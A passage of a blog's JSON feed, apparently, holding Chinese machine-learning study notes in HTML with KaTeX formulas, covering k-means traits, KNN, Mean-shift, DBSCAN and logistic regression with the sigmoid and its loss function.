mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span></li>\n<li>重复过程直到收敛</li>\n</ul>\n<p>特点：<br />\n实现简单，收敛快；<br />\n但需要指定<mark>类别的数量</mark>，<br />\n且选择的初始中心点不同，结果可能不同，结果可能<mark>缺乏一致性</mark>。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1706021339/Typera/2024/01/169818722555497ae9d461a7352fabd1.gif\" alt=\"动图\" /></p>\n<h2 id=\"knn\"><a class=\"anchor\" href=\"#knn\">#</a> KNN</h2>\n<p>k 近邻分类算法（k nearest neighbor，<strong>监督学习</strong>算法）</p>\n<p>核心步骤：<br />\n对于新输入的实例</p>\n<ul>\n<li>在训练数据集中找到与新实例最接近的 k 个实例</li>\n<li>k 个实例中多数属于某个类，则把新实例归入该类</li>\n</ul>\n<h2 id=\"mean-shift\"><a class=\"anchor\" href=\"#mean-shift\">#</a> Mean-shift</h2>\n<p>均值漂移聚类算法：基于密度梯度上升的算法 =&gt; 沿着密度上升方向寻找聚类中心点</p>\n<p>核心步骤：<br />\n设区域簇 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>u</mi></mrow><annotation encoding=\"application/x-tex\">u</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">u</span></span></span></span> 内 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi></mrow><annotation encoding=\"application/x-tex\">k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6944em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span></span></span></span> 个数据点为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator=\"true\">,</mo><mo>…</mo><mo separator=\"true\">,</mo><msub><mi>x</mi><mi>k</mi></msub></mrow><annotation encoding=\"application/x-tex\">x_1,x_2,\\dots,x_k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>，区域簇半径为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>r</mi></mrow><annotation encoding=\"application/x-tex\">r</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span></span></span></span><br />\n 中心点初始值为<strong>随机指定</strong>的未分类点</p>\n<ol>\n<li>在中心点一定半径 ( <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>r</mi></mrow><annotation encoding=\"application/x-tex\">r</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span></span></span></span> ) 的区域内，计算每个数据与中心点偏移的均值 =&gt; <strong>均值偏移</strong> <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>M</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mfrac><mn>1</mn><mi>k</mi></mfrac><msub><mo>∑</mo><mrow><msub><mi>x</mi><mi>i</mi></msub><mo>∈</mo><msub><mi>s</mi><mi>h</mi></msub></mrow></msub><mo stretchy=\"false\">(</mo><mi>u</mi><mo>−</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">M(x)=\\frac{1}{k}\\sum_{x_i\\in s_h}(u-x_i)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.2507em;vertical-align:-0.4056em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8451em;\"><span style=\"top:-2.655em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.394em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.345em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mop\"><span class=\"mop op-symbol small-op\" style=\"position:relative;top:0em;\">∑</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.0777em;\"><span style=\"top:-2.4003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3281em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.0714em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span><span class=\"mrel mtight\">∈</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3488em;margin-left:0em;margin-right:0.0714em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">h</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1512em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.4056em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">u</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span></li>\n<li><strong>更新</strong>中心点为 原中心点加均值偏移 =&gt; <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>u</mi><mo>=</mo><mi>u</mi><mo>+</mo><mi>M</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">u=u+M(x)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">u</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6667em;vertical-align:-0.0833em;\"></span><span class=\"mord mathnormal\">u</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span></span></span></span></li>\n<li>重复流程到中心点稳定</li>\n</ol>\n<p>特点：<br />\n不需要人为选择类别数量，但需要指定<mark>区域半径</mark>（ <code>bandwidth</code> ）</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1706021565/Typera/2024/01/89ca96a875623a1eee8814cc4066ae01.gif\" alt=\"\" /></p>\n<h2 id=\"dbscan\"><a class=\"anchor\" href=\"#dbscan\">#</a> DBSCAN</h2>\n<p>基于密度的空间聚类算法</p>\n<ol>\n<li>基于 <strong>区域点密度</strong> 筛选有效数据</li>\n<li>基于有效数据向周边扩张，直到没有新点加入</li>\n</ol>\n<p>特点：</p>\n<ol>\n<li><mark>过滤噪音数据</mark></li>\n<li>不需要人为选择类别数量</li>\n<li>如果<mark>数据密度不同</mark>，将影响结果</li>\n</ol>\n",
            "tags": [
                "毕业设计",
                "机器学习"
            ]
        },
        {
            "id": "https://www.sycamore.top/Graduation/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%9B%9E%E5%BD%92/",
            "url": "https://www.sycamore.top/Graduation/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%9B%9E%E5%BD%92/",
            "title": "回归",
            "date_published": "2024-01-22T05:36:10.000Z",
            "content_html": "<h1 id=\"线性回归\"><a class=\"anchor\" href=\"#线性回归\">#</a> 线性回归</h1>\n<h1 id=\"逻辑回归\"><a class=\"anchor\" href=\"#逻辑回归\">#</a> 逻辑回归</h1>\n<p>（用于解决<strong>分类</strong>问题）</p>\n<p>要点：<br />\n<mark>①寻找决策边界的格式</mark><br />\n<mark>②损失函数最小化情况下，求解决策边界的系数</mark></p>\n<blockquote>\n<p>分类问题</p>\n</blockquote>\n<p>逻辑回归的<strong>简单解释：</strong></p>\n<p><code>sigmoid</code>  函数（一种概率分布函数）<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>S</mi><mrow><mo fence=\"true\">(</mo><mi>x</mi><mo fence=\"true\">)</mo></mrow><mo>=</mo><mfrac><mn>1</mn><mrow><mn>1</mn><mo>+</mo><msup><mi>e</mi><mrow><mo>−</mo><mi>x</mi></mrow></msup></mrow></mfrac></mrow><annotation encoding=\"application/x-tex\">S\\left(x\\right)=\\frac{1}{1+e^{-x}}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.2484em;vertical-align:-0.4033em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8451em;\"><span style=\"top:-2.655em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mbin mtight\">+</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">e</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7027em;\"><span style=\"top:-2.786em;margin-right:0.0714em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mathnormal mtight\">x</span></span></span></span></span></span></span></span></span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.394em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.4033em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span> ，图像如下：<br />\n其中 <code>S(x) &gt; 0.5</code>  的视为 1， <code>S(x) &lt; 0.5</code>  的视为 0，即可对所有的 <code>x</code>  进行分类。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1705998579/Typera/2024/01/8468ec07ee4a5ffceb5cff246cbe996e.png\" alt=\"image-20240123162931645\" /></p>\n<blockquote>\n<p>概率分布函数</p>\n</blockquote>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>P</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mn>1</mn><mo>+</mo><msup><mi>e</mi><mrow><mo>−</mo><mi>g</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo></mrow></msup></mrow></mfrac></mrow><annotation encoding=\"application/x-tex\">P(x)=\\frac{1}{1+e^{-g(x)}}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.2889em;vertical-align:-0.4438em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8451em;\"><span style=\"top:-2.6146em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mbin mtight\">+</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">e</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.822em;\"><span style=\"top:-2.822em;margin-right:0.0714em;\"><span class=\"pstrut\" style=\"height:2.5357em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">g</span><span class=\"mopen mtight\">(</span><span class=\"mord mathnormal mtight\">x</span><span class=\"mclose mtight\">)</span></span></span></span></span></span></span></span></span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.394em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.4438em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span>，其中 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>g</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding=\"application/x-tex\">g(x)=0</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord\">0</span></span></span></span> 为<strong>决策边界</strong>（Decision Boundary）， <code>sigmoid</code>  函数就是<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>g</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">g(x)=x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span> 的情况。<br />\n（所以 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>P</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">P(x)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span></span></span></span> 分类方法同 <code>sigmoid</code>  函数）</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>g</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>=</mo><msub><mi>θ</mi><mn>0</mn></msub><mo>+</mo><msub><mi>θ</mi><mn>1</mn></msub><msub><mi>x</mi><mn>1</mn></msub><mo>+</mo><mo>…</mo></mrow><annotation encoding=\"application/x-tex\">g(x)=\\theta_0+\\theta_1x_1+\\dots</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">θ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">θ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.123em;\"></span><span class=\"minner\">…</span></span></span></span> 为一般格式，<em>可能为多元，包含高次项</em></p>\n<blockquote>\n<p>损失函数</p>\n</blockquote>\n<p>损失函数 <code>J</code>  即用于评估分类结果的函数。对于不正确的分类结果， <code>J</code>  越大越好；对于正确的分类结果， <code>J</code>  越小越好</p>\n<p>因此有 <strong>单个样本的损失函数</strong>：<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>J</mi><mi>i</mi></msub><mo>=</mo><mrow><mo fence=\"true\">{</mo><mtable rowspacing=\"0.16em\" columnalign=\"center center\" columnspacing=\"1em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mo>−</mo><mi>log</mi><mo>⁡</mo><mo fence=\"true\" stretchy=\"true\" minsize=\"1.2em\" maxsize=\"1.2em\">(</mo><mi>P</mi><mo stretchy=\"false\">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy=\"false\">)</mo><mo fence=\"true\" stretchy=\"true\" minsize=\"1.2em\" maxsize=\"1.2em\">)</mo><mo separator=\"true\">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><msub><mi>y</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mo>−</mo><mi>log</mi><mo>⁡</mo><mo fence=\"true\" stretchy=\"true\" minsize=\"1.2em\" maxsize=\"1.2em\">(</mo><mn>1</mn><mo>−</mo><mi>P</mi><mo stretchy=\"false\">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy=\"false\">)</mo><mo fence=\"true\" stretchy=\"true\" minsize=\"1.2em\" maxsize=\"1.2em\">)</mo><mo separator=\"true\">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><msub><mi>y</mi><mi>i</mi></msub><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding=\"application/x-tex\">\\left.J_i=\\left\\{\\begin{matrix}-\\log\\bigl(P(x_i)\\bigr), &amp;y_i=1\\\\-\\log\\bigl(1-P(x_i)\\bigr), &amp;y_i=0\\end{matrix}\\right.\\right.</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:2.42em;vertical-align:-0.96em;\"></span><span class=\"minner\"><span class=\"mopen nulldelimiter\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:-0.0962em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size3\">{</span></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.46em;\"><span style=\"top:-3.61em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"mopen\"><span class=\"delimsizing size1\">(</span></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing 